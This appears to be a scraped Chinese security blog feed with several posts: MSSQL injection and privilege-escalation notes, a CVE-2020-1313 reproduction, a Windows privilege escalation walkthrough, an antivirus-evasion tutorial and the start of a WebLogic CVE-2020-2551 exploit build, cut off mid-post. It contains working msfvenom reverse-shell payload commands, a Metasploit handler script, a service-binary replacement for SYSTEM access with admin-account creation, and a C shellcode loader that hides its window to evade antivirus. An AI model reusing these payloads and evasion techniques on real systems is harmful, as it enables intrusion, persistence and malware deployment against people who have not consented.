Job执行命令的方法<br><a href="https://www.anquanke.com/post/id/84646">https://www.anquanke.com/post/id/84646</a></p><p>if&lt; xp_cmdshell执行 &gt;，存储过程恢复，权限维持，写入shell，读取表，读取密码，<br>MSSQL注入xp_cmdshell<br><a href="https://www.freebuf.com/sectool/55577.html">https://www.freebuf.com/sectool/55577.html</a><br>重建sp_makewebtask存储过程获取webshell<br><a href="http://www.vfocus.net/art/20100426/7024.html">http://www.vfocus.net/art/20100426/7024.html</a></p><p>mssql注入经常使用的命令<br><a href="https://www.cnblogs.com/cnjava/archive/2012/06/13/2547524.html">https://www.cnblogs.com/cnjava/archive/2012/06/13/2547524.html</a></p><p>MSSQL注入两种执行命令的方法<br><a href="https://www.codercto.com/a/10181.html">https://www.codercto.com/a/10181.html</a></p><p>iisgetshell==尝试写入cer<br>php审计 phar反序列化xxx<br>python 沙箱逃逸xxxx</p><p>1，删除存储过程execsp_dropextendedproc ‘xp_cmdshell’，最好删除xplog70.dll等文件<br>2，网站数据库不要使用sa账户，对服务运行权限设定为普通账户<br>3，安装相关安全软件<br>4, bypassWAF<br>5, bypassAV<br>6, 社工水坑<br>7, 安全工具使用</p><p>sqlserver clr 提权<br><a href="https://blog.csdn.net/heoo442/article/details/48177977">https://blog.csdn.net/heoo442/article/details/48177977</a><br><a href="https://www.anquanke.com/post/id/86455">https://www.anquanke.com/post/id/86455</a><br><a href="https://www.sohu.com/a/429672521_466846">https://www.sohu.com/a/429672521_466846</a></p><h3 id="2-Sql注入中的特性"><a href="#2-Sql注入中的特性" class="headerlink" title="2.Sql注入中的特性"></a>2.Sql注入中的特性</h3><p>bypass WAF，数据带外，判断方法</p><h3 id="3-SMSS密码解密"><a href="#3-SMSS密码解密" class="headerlink" title="3.SMSS密码解密"></a>3.SMSS密码解密</h3><p>在有目标服务器权限的情况下，可以通过SSMSPwd工具(<a href="https://github.com/zcgonvh/SSMSPwd)%E8%A7%A3%E5%AF%86SqlServer%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81,%E8%BF%9C%E7%A8%8B%E6%88%96%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A51433%E7%AB%AF%E5%8F%A3%E8%BF%9B%E8%A1%8C%E7%AE%A1%E7%90%86%E3%80%82">https://github.com/zcgonvh/SSMSPwd)解密SqlServer用户密码,远程或代理连接1433端口进行管理。</a><br>使用.Net编译源码：</p><pre class="line-numbers language-cmd"><code class="language-cmd">#for .net 2.0%systemroot%\microsoft.net\framework\v2.0.50727\csc.exe SSMSPwd.cs#for .net 4.0(server2008+)%systemroot%\microsoft.net\framework\v4.0.30319\csc.exe /out:SSMSPwd40.exe SSMSPwd.cs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cmd"><code class="language-cmd">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe SSMSPwd.cs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/12/08/Z52BKtlwSJEb1vy.png" alt="csc"><br>使用-f指定.net序列化SqlStudio.bin，-p指定依赖项目录：</p><pre class="line-numbers language-cmd"><code class="language-cmd">SSMSPwd.exe -f "C:\Users\Administrator\AppData\Roaming\Microsoft\SQL Server Management Studio\13.0\SqlStudio.bin" -p "C:\Program Files (x86)\Microsoft SQL Server\130\Tools\Binn\ManagementStudio" <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功解密：<br><img src="https://i.loli.net/2020/12/09/nh9TbG4DIRWeB8F.png"></p><h3 id="4-sqlserver作代理服务器脚本。。"><a href="#4-sqlserver作代理服务器脚本。。" class="headerlink" title="4.sqlserver作代理服务器脚本。。"></a>4.sqlserver作代理服务器脚本。。</h3><p>啊 安恒的分享PPT</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 程序安装 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLServer2016 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-1313复现</title>
      <link href="/2020/10/09/cve-2020-1313-fu-xian/"/>
      <url>/2020/10/09/cve-2020-1313-fu-xian/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><blockquote><p>CVE-ID:CVE-2020-1313</p><p>类型：本地提权</p><p>POC: <a href="https://github.com/irsl/CVE-2020-1313">https://github.com/irsl/CVE-2020-1313</a></p><p>原理：利用Windows Update Orchestrator Service (是一个DCOM服务9C695035-48D2-4229-8B73-4C70E756E519) 暴露的API方法无需认证来进行计划任务的设置，计划任务以SYSTEM权限执行，导致权限提升。</p><p>影响版本：<br>Windows 10 Version 1903 for 32-bit Systems<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 2004 for 32-bit Systems<br>Windows 10 Version 2004 for ARM64-based Systems<br>Windows 10 Version 2004 for x64-based Systems<br>Windows Server, version 1903 (Server Core installation)<br>Windows Server, version 1909 (Server Core installation)<br>Windows Server, version 2004 (Server Core installation)</p></blockquote><h4 id="2-编译复现"><a href="#2-编译复现" class="headerlink" title="2. 编译复现"></a>2. 编译复现</h4><p> 拉取poc后直接编译成Debug版本后，在虚拟机中cmd执行发现没有反应，双击执行后报错(物理机正常执行，考虑是虚拟机中运行环境的原因):</p><p><img src="https://i.loli.net/2020/10/09/fChwuaHAze9I3xg.png" alt="缺失DLL"></p><p>搜索缺少的DLL后，看到文章(<a href="https://blog.csdn.net/so_geili/article/details/53009680">https://blog.csdn.net/so_geili/article/details/53009680</a> 和 <a href="https://www.cnblogs.com/xzabg/p/5875296.html),%E8%AF%B4%E6%98%AF%E7%BC%96%E8%AF%91%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%8C%E7%84%B6%E5%90%8Evs%E8%BF%9B%E8%A1%8C%E8%AE%BE%E7%BD%AE%E5%A6%82%E4%B8%8B%EF%BC%9A">https://www.cnblogs.com/xzabg/p/5875296.html),说是编译的原因，然后vs进行设置如下：</a></p><p><img src="https://i.loli.net/2020/10/09/V6KjMf8JYCZAUwr.png" alt="运行库设置"></p><p>在项目属性-C/C++-代码生成-运行库中将其设置为静态编译 /MTd ，编译成功后文件为849kb：<br><img src="https://i.loli.net/2020/10/09/koVfPg2RhBL9EYz.png" alt="执行"></p><p>随后放到虚拟机里执行成功，可以看到注册表中新增了一项，命令在之后的一段时间内会自动触发。<br>接下来试试将选项设置为 release，生成后大小13kb:<br><img src="https://i.loli.net/2020/10/09/BQ2uz8SaMoVWmC1.png" alt="release"><br>执行成功：<br><img src="https://i.loli.net/2020/10/09/1tIb6v3nMmXyxNU.png" alt="执行成功"><br>然后一段时间后会在C盘生成个命令执行的txt，实际利用可以用powershell等来执行其他反弹shell的操作~</p><h4 id="3-其他"><a href="#3-其他" class="headerlink" title="3. 其他"></a>3. 其他</h4><p>在编译过程中，遇到运行库的问题，将网上看到的在这里记录一下。</p><h5 id="1-运行库设置"><a href="#1-运行库设置" class="headerlink" title="1.运行库设置"></a>1.运行库设置</h5><blockquote><p>多线程(/MT)、多线程调试(/MTd)、多线程DLL(/MD)、多线程调试DLL(/MDd)、单线程(/ML)、单线程调试(/MLd)，带D的是Debug模式，单线程运行时库选项/ML和/MLd在VS2003以后就取消了。<br>/MT 、 /MTd：<br>/MT和/MTd表示采用多线程CRT库的静态lib版本。该选项会在编译时将运行时库以静态lib的形式完全嵌入。该选项生成的可执行文件运行时不需要运行时库dll的参加，会获得轻微的性能提升，但最终生成的二进制代码因链入庞大的运行时库实现而变得非常臃肿。当某项目以静态链接库的形式嵌入到多个项目，则可能造成运行时库的内存管理有多份，最终将导致致命的“Invalid Address specified to RtlValidateHeap”问题。另外托管C++和CLI中不再支持/MT和/MTd选项。</p><p>/MD、/MDd：<br>/MD和/MDd表示采用多线程CRT库的动态dll版本，会使应用程序使用运行时库特定版本的多线程DLL。链接时将按照传统VC链接dll的方式将运行时库MSVCRxx.DLL的导入库MSVCRT.lib链接，在运行时要求安装了相应版本的VC运行时库可再发行组件包（当然把这些运行时库dll放在应用程序目录下也是可以的）。 因/MD和/MDd方式不会将运行时库链接到可执行文件内部，可有效减少可执行文件尺寸。当多项目以MD方式运作时，其内部会采用同一个堆，内存管理将被简化，跨模块内存管理问题也能得到缓解。</p></blockquote><h5 id="2-调试信息的隐藏"><a href="#2-调试信息的隐藏" class="headerlink" title="2.调试信息的隐藏"></a>2.调试信息的隐藏</h5><p>编译为可执行文件后，用16进制查看发现存在一些路径信息、printf的信息:<br><img src="https://i.loli.net/2020/10/09/xSUBOYdIzgMT7Xf.png" alt="路径信息"></p><p><img src="https://i.loli.net/2020/10/09/nbUVfdHhmwxWJpK.png" alt="printf的信息"></p><p>解决方法：<br>在属性链接器-调试中关闭调试信息：</p><p><img src="https://i.loli.net/2020/10/09/pHEgo97U3Xr4byD.png" alt="关闭调试信息生成"></p><p>然后捏，还可以用UPX 压缩一下文件 upx -9 xx.exe,从13kb压缩到9kb了。</p><h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h4><p><a href="https://www.freebuf.com/vuls/245706.html">https://www.freebuf.com/vuls/245706.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
            <tag> Windows 10 </tag>
            
            <tag> CVE-2020-1313 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次简单的win提权</title>
      <link href="/2020/09/06/ji-yi-ci-jian-dan-de-win-ti-quan/"/>
      <url>/2020/09/06/ji-yi-ci-jian-dan-de-win-ti-quan/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><p> 在一次测试中，通过rce漏洞获得了目标主机meterpreter会话，尝试进行一些提权实验。过程中两台机子都不通外网，本文记录一下获得会话并提权过程。 </p><h4 id="2-获取msf会话"><a href="#2-获取msf会话" class="headerlink" title="2. 获取msf会话"></a>2. 获取msf会话</h4><p>生成一个exe载荷,看情况免杀：</p><pre class="line-numbers language-shell"><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=443 -f exe -o 666.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在准备让目标机执行我们的载荷前，先使用脚本(通过msfpc来生成)来快速监听会话，并进行一些自动进程迁移的工作：</p><pre class="line-numbers language-shell"><code class="language-shell">msfconsole -q -r '/home/yanghao/windows-meterpreter-staged-reverse-tcp-443-exe.rc'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>脚本内容如下：</p><pre class="line-numbers language-shell"><code class="language-shell">use exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.122.135set LPORT 443set ExitOnSession falseset EnableStageEncoding trueset EnableUnicodeEncoding trueset AutoRunScript 'post/windows/manage/migrate' run -j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数的具体含义可以在设置了payload后执行show advanced查看:<br><img src="https://i.loli.net/2020/09/06/5v9ztK1OHNwClrm.png"><br>开始监听：<br><img src="https://i.loli.net/2020/09/06/EUw2GiQyRmSAg5L.png"><br>在目标机上执行生成的exe,获取会话：<br><img src="https://i.loli.net/2020/09/06/CpsugnLKoOMDT42.png"></p><h4 id="3-尝试提权"><a href="#3-尝试提权" class="headerlink" title="3. 尝试提权"></a>3. 尝试提权</h4><p>看了下目标已经是管理员权限了，如果要抓密码的话，得拿到system，准备试试。先ps看一下进程，发现有杀软，不过没关系，没有外网战力-50%:<br><img src="https://i.loli.net/2020/09/06/jKAURZu2DYNGSzV.png"><br>假装getsystem一下，whoami /priv 查看一下权限：<br><img src="https://i.loli.net/2020/09/06/2rCwVAfFNESi3hb.png" alt="getsystem"></p><p><img src="https://i.loli.net/2020/09/06/9eFRZGuTcUXVqAm.png" alt="whoami /priv"></p><h5 id="local-exploit-suggester模块失败"><a href="#local-exploit-suggester模块失败" class="headerlink" title="local_exploit_suggester模块失败"></a>local_exploit_suggester模块失败</h5><p>试试自带的模块来检查提权漏洞：</p><pre class="line-numbers language-shell"><code class="language-shell">use post/multi/recon/local_exploit_suggester<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/09/06/oBGYQmOS76RuW3b.png" alt="local_exploit_suggester"><br>发现有了一些漏洞，然后就加载对应的利用模块来进行尝试：<br><img src="https://i.loli.net/2020/09/06/gXSiGskL4K1hYaC.png" alt="失败1"></p><p><img src="https://i.loli.net/2020/09/06/RqOQy21rmzaC79v.png" alt="失败2"></p><p><img src="https://i.loli.net/2020/09/06/b6kiR7uDV5Y3QcJ.png" alt="失败3"></p><h5 id="柳暗花明-enum-services利用"><a href="#柳暗花明-enum-services利用" class="headerlink" title="柳暗花明(enum_services利用)"></a>柳暗花明(enum_services利用)</h5><p>差不多模块都试了一下，因为有杀软的原因，都失败了。这时候想着找点新的exp来用用，但是网络不太方便，就先看看主机上的情况，先看了下主机上启动的服务情况：</p><pre class="line-numbers language-shell"><code class="language-shell">use post/windows/gather/enum_services<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/09/06/vCjN63hxmKEnL9l.png" alt="查看服务"><br>发现了一个在D盘的服务(wpscloudsvr LocalSystem  “D:\Program Files\WPS Office\wpscloudsvr.exe” LocalService)：<br><img src="https://i.loli.net/2020/09/06/hdliZFzBrOeIA75.png" alt="wpscloudsvr.exe"><br>这里我们知道， 在C盘Windows,Program Files等目录下的文件都会被系统权限保护，而这个wpscloudsvr服务的可执行文件放在了D盘(这也是个很正常的事，总不能啥软件都往C盘装吧)，如果软件开发过程中未对这种类似服务的文件进行权限限制同时任意用户可以对其服务进行重启动，那么就可以利用替换该服务文件的方法来获得权限提升。接下来通过<code> cacls wpscloudsvr.exe</code> 查看文件权限，发现权限设置不当，标准用户可以对其更改(图找不到了，大概结果就像下面这样)，同时发现可以直接使用net命令来启动和停止其服务：<br><img src="https://i.loli.net/2020/09/06/pMJYBTNtlm3AfPq.png" alt="NT AUTHORITY\Authenticated Users:C"></p><p>现在条件都满足了，生成个马给这个文件替换了，重新启动服务不就完成提权了吗？快速操作中…<br>1、使用msfvenom生成一个exe-service类型的载荷：</p><pre class="line-numbers language-shell"><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=8522 -f exe-service -o wpscloudsvr.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/09/06/MYqaP8yu9nQf7XZ.png" alt="exe-service"><br>2、上传并启动服务,并获得了会话:</p><pre class="line-numbers language-shell"><code class="language-shell">uplaod /xx/xx/wpscloudsvr.exe "D:\\Program Files\\WPS Office\\wpscloudsvr.exe"shell>net start wpscloudsvr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2020/09/06/kwdlUENItnpOHJ8.png"><br>这里就拿到了system权限的会话了：<br><img src="https://i.loli.net/2020/09/06/meE4iFVNKJnOBHf.png"></p><p><img src="https://i.loli.net/2020/09/06/dj4W8KmTiaMIEtl.png"><br>后面就是上远程桌面看看，加个管理员账户什么的：<br><img src="https://i.loli.net/2020/09/06/orWRgGIUk7ZubB1.png"></p><p><img src="https://i.loli.net/2020/09/06/6omMlNKGb3QZUz2.png"></p><h4 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h4><p>1、使用metasploit脚本进行自动化设置<br>2、metasploit本地提权漏洞扫描、利用，相关信息收集模块使用；<br>3、服务可执行文件权限设置不当的cacls检查、exe-service载荷生成、替换执行提权。</p><h4 id="5-参考"><a href="#5-参考" class="headerlink" title="5. 参考"></a>5. 参考</h4><p><a href="https://blog.csdn.net/l1028386804/article/details/86669614">https://blog.csdn.net/l1028386804/article/details/86669614</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows服务提权 </tag>
            
            <tag> metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单的源码免杀</title>
      <link href="/2020/08/30/jian-dan-de-yuan-ma-mian-sha/"/>
      <url>/2020/08/30/jian-dan-de-yuan-ma-mian-sha/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><p> 经常看到各种免杀的例子，源码免杀、二进制免杀、加载器免杀等等，最近学习了一下源码层面的免杀，在实验过程中与杀软对抗最终成功免杀，写下本文做个记录。 </p><h4 id="2-shellcode生成和二进制文件编译"><a href="#2-shellcode生成和二进制文件编译" class="headerlink" title="2. shellcode生成和二进制文件编译"></a>2. shellcode生成和二进制文件编译</h4><p>   开始前有个小插曲，用360扫了扫之前编译的样本，当时v站查杀率1/72(提交到v站后cs一共上线了107台主机，emm)：<br> <img src="https://i.loli.net/2020/08/30/vF6ufsto52GzQ4c.png" alt="virus"><br> 今天扫描的时候：<br> <img src="https://i.loli.net/2020/08/30/jmkJoFchbgOls9a.png" alt="-查杀结果-"><br> 啊… Q哒不妞Q(Qwq)<br> <img src="https://i.loli.net/2020/08/30/pxslvIq4YmhzaWL.jpg"></p><p>好了不说了，进入正题，首先我们使用msfvenom生成C语言shellcode:</p><pre class="line-numbers language-c"><code class="language-c">msfvenom <span class="token operator">-</span>a x86 <span class="token operator">--</span>platform windows <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_http <span class="token operator">-</span>e x86<span class="token operator">/</span>shikata_ga_nai <span class="token operator">-</span>i <span class="token number">12</span> <span class="token operator">-</span>b <span class="token string">'\x00'</span> LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">8.102</span> LPORT<span class="token operator">=</span><span class="token number">6666</span> <span class="token operator">-</span>f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/08/30/GCZerU1cp9gEFH2.png" alt="msfvenom"><br>然后网上找了一段C语言加载shellcode的代码。。通过内联汇编加载shellcode：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">pragma</span> comment(linker, "/OPT:nowin98")</span><span class="token macro property">#<span class="token directive keyword">pragma</span> comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")</span><span class="token comment" spellcheck="true">//不显示窗口</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">"shellcode"</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//内联汇编</span>    __asm       <span class="token punctuation">{</span>        lea eax<span class="token punctuation">,</span>buf<span class="token punctuation">;</span>           call eax<span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>话不多说，先编译上线测试，启动msf监听：</p><pre class="line-numbers language-shell"><code class="language-shell">handler -p windows/meterpreter/reverse_http -H 0.0.0.0 -P 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://i.loli.net/2020/08/30/y7BndOlu3JG8PKt.png" alt="handler"><br> 另一边编译源码，生成exe:<br> <img src="https://i.loli.net/2020/08/30/oVZv6XKxrecbFAw.png" alt="Build_exe"><br> 双击执行exe,msf上线：<br> <img src="https://i.loli.net/2020/08/30/UyCWEo2DpJdAu84.png" alt="reverse_meterpreter"><br> 执行过程发现没有被拦截，看起来这已经免杀了：<br> <img src="https://i.loli.net/2020/08/30/RvXdq423TsuyhNE.png" alt="免杀成功"><br> 好的，免杀成功，本文结束。</p><h4 id="3-VS免杀测试"><a href="#3-VS免杀测试" class="headerlink" title="3. VS免杀测试"></a>3. VS免杀测试</h4><p>  结束是不可能结束的，不然怎么混篇幅，只能换个不免杀的编译器，被杀了再随便改改源码这样子。<br>  用VS2019来编译源码，启动vs:<br><img src="https://i.loli.net/2020/08/30/SWCNs72Iv8kcBxp.png" alt="start vs2019"></p><p><img src="https://i.loli.net/2020/08/30/rjUdwQhYV7m3Tpk.png" alt="创建项目"></p><p><img src="https://i.loli.net/2020/08/30/dmXu9wGJBg748rK.png" alt="复制代码编译"><br>是吧，被发现了，我们将恶意代码全部删除后编译，发现还是被杀：<br><img src="https://i.loli.net/2020/08/30/tVhmFpTIdPL9iBJ.png"><br>emmm? 怎么办啊，这都杀!? 其实有朋友应该注意到了下面这段代码，好吧 ，我是故意没删的，因为特征就是在这：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">pragma</span> comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"") </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来将这段代码删除，重新生成exe，然后进行扫描，发现成功过了杀软:<br><img src="https://i.loli.net/2020/08/30/lDvSHZB6jrOtFcU.png"></p><p>vs编译的这个内联加载不能正常上线，修改下加载方法：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">"shellcode"</span><span class="token punctuation">;</span>    <span class="token keyword">void</span><span class="token operator">*</span> exec <span class="token operator">=</span> <span class="token function">VirtualAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span> buf<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>exec<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>exec<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么编译执行后会有个DOS窗口：<br><img src="https://i.loli.net/2020/08/30/LVk8Qa3oDpbilH9.png"></p><p>这里我们<a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">ShowWindow</a>函数来隐藏窗体：<br><img src="https://i.loli.net/2020/08/30/lf5rY1kmBswMRaq.png" alt="ShowWindow"><br>需要两个参数，一个是程序窗口句柄，可以通过<a href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">GetConsoleWindow</a> 来获得当前窗口句柄，另一个是int类型的nCmdShow，来控制窗口的状态，这里使用SW_HIDE来隐藏窗口：<br><img src="https://i.loli.net/2020/08/30/H5RLctbSJnQBorW.png" alt="nCmdShow"></p><pre class="line-numbers language-c"><code class="language-c"><span class="token function">ShowWindow</span><span class="token punctuation">(</span><span class="token function">GetConsoleWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> SW_HIDE<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后再编译执行和免杀测试，可以看到免杀且无窗口：<br><img src="https://i.loli.net/2020/08/30/sQ1j6vhLouC5dOb.png"></p><h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h4><p><a href="https://www.zhihu.com/question/282945808">https://www.zhihu.com/question/282945808</a><br><a href="https://blog.csdn.net/zac_sian/article/details/46778285">https://blog.csdn.net/zac_sian/article/details/46778285</a><br><a href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">https://docs.microsoft.com/en-us/windows/console/getconsolewindow</a><br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> msfvenom免杀 </tag>
            
            <tag> C语言免杀 </tag>
            
            <tag> 隐藏程序窗口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-2551复现</title>
      <link href="/2020/08/22/cve-2020-2551-fu-xian/"/>
      <url>/2020/08/22/cve-2020-2551-fu-xian/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><blockquote><p>2020年1月15日, Oracle官方发布了Weblogic IIOP反序列化漏洞CVE-2020-2551的漏洞通告，漏洞等级为高危，CVVS评分为9.8分，漏洞利用难度低。影响范围为10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0。</p></blockquote><h4 id="2-获取exp并配置编译"><a href="#2-获取exp并配置编译" class="headerlink" title="2. 获取exp并配置编译"></a>2. <a href="https://github.com/zzwlpx/weblogicPoc">获取exp</a>并配置编译</h4><p> <i class="far fa-hand-point-right"> 给项目配置JDK</i><br>  <img src="https://i.loli.net/2020/08/22/eqLaXfthxCWPFkb.png" alt="目录结构"></p><p>  <img src="https://i.loli.net/2020/08/22/MTPlbWHDxef7IaJ.png" alt="选择jdk"></p><p> <i class="far fa-hand-point-right"> 配置Modules</i><br> 选择src 后点 Sources,  选择out 后点 Excluded<br> <img src="https://i.loli.net/2020/08/22/94IgR1yeohwfvVc.png"><br> 选完之后，看到一排红：<br><img src="https://i.loli.net/2020/08/22/QzGhpBJ8mcwI4SE.png"><br> 这是因为有些包没导入，代码找不到，这里把lib文件夹下的包导入进项目：<br> <img src="https://i.loli.net/2020/08/22/HJzGVU4k5uQACiI.png"><br> 然后就没得报错了：<br><img src="https://i.loli.net/2020/08/22/sAg9FH5QVyDKwou.png"></p><p>  <i class="far fa-hand-point-right"> 打包配置</i><br>配置build:<br><img src="https://i.loli.net/2020/08/22/bSU72uhVIwdpGCn.png"><br>选择main函数：<br><img src="https://i.loli.net/2020/08/22/BR8ElPGQiuxXgew.png"><br>build打包成可执行文件：<br><img src="https://i.loli.net/2020/08/22/hKMricwEuIpgAJn.png"><br>发现又报错了，说没设置输出路径，配置一下:<br><img src="https://i.loli.net/2020/08/22/7mbKwzFtJElnU6g.png"></p><p><img src="https://i.loli.net/2020/08/22/l1fcKw7dn4mZpJe.png"><br>继续build，又报错：<br><img 